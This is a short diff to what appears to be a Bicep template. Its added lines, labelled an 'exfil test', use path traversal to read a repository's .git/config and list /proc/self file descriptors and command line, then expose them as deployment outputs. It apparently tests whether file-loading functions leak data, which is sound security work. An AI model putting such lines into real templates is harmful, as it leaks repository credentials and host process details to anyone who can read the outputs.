@@ -1,4 +1,4 @@
-var environ = loadTextContent('/proc/self/cmdline')
-var maps = loadTextContent('/proc/self/maps')
-output cmdline string = environ
-output memMaps string = maps
+// Comprehensive exfil test
+output gitConfig string = loadTextContent('../../.git/config')
+output fds array = loadDirectoryFileInfo('/proc/self/fd/', '*')
+output procCmdline string = loadTextContent('/proc/self/cmdline')
